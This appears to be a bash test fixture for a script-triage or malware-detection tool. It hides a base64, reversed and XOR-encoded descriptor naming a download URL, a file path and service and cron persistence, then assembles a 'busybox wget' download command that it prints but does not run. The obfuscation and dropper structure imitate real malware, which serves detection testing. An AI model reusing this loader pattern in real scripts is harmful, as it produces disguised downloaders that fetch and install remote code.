#!/usr/bin/env bash

# Huntress Script Triage -- inert static-analysis fixture (bash_linux)

readonly Material_630e0691='hNPX04CEgtaBhJ/X1dPGwZyd19rR09GfwcHXwMbcx9qdwt/GnY/axtPC7dfe29TOhNPX04CEgtaBhJ3Q0''/7BwdfAxtzH+o/G3NfV0+3A18HHztrBnIGCg9TQ14DXndbb3tPE3Nuc197C39PK15yE09fTgISC1oGEnZ''2IwcLGxtqP3sDHzoTT19OAhILWgYSf3NXb08Lf09GP1tvt3NXb08Lf09HOg4/G3Mfd0e3X1dPGwc7Gx8L''Gx93txtfVxe3K3dDLwcfQj8DXxsLT1tPO197b1O3XxtvAxZ7Xxt3f18Dt18Dbx8PR04/BwtfGwc6Dj8Q='

readonly Codec_630e0691='base64_chunks|reverse_then_xor|b2'



Load_630e0691() {

  EnCoDeD_Bytes=()

  local PaRt

  while read -r PaRt; do [[ -n "$PaRt" ]] && EnCoDeD_Bytes+=("$PaRt"); done < <(printf '%s' "${Material_630e0691}" | base64 --decode | od -An -v -tu1 | tr -s ' ' '\n' | sed '/^$/d')

}



Decode_630e0691() {

  DeCoDeD_Bytes=()

  local InDeX

  for ((InDeX=0; InDeX<${#EnCoDeD_Bytes[@]}; InDeX++)); do

    DeCoDeD_Bytes[${#EnCoDeD_Bytes[@]}-1-InDeX]="$((EnCoDeD_Bytes[InDeX] ^ 178))"

  done

}



Recover_630e0691() {

  local -a EnCoDeD_Bytes DeCoDeD_Bytes

  local DeScRiPtOr_Text NeUtRaL PaSs InDeX

  if ((2 > 1)); then NeUtRaL=left; else NeUtRaL=right; fi

  Load_630e0691

  for PaSs in 1; do Decode_630e0691; done

  DeScRiPtOr_Text=''

  local octal character

  for InDeX in "${!DeCoDeD_Bytes[@]}"; do

    printf -v octal '%03o' "${DeCoDeD_Bytes[InDeX]}"

    printf -v character '%b' "\\$octal"

    DeScRiPtOr_Text+="$character"

  done

  printf '%s\n' "$DeScRiPtOr_Text"

}



Inspect_630e0691() { local recovered; recovered="$(Recover_630e0691)"; printf '%s\n' "$recovered"; }



Plan_630e0691() {

  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''

  descriptor="$(Inspect_630e0691)"

  local -a fields

  IFS='|' read -r -a fields <<< "$descriptor"

  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done

  local -a request_command=(busybox wget -qO "$file_path" "$url")

  declare -p request_command

}



if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_630e0691; fi

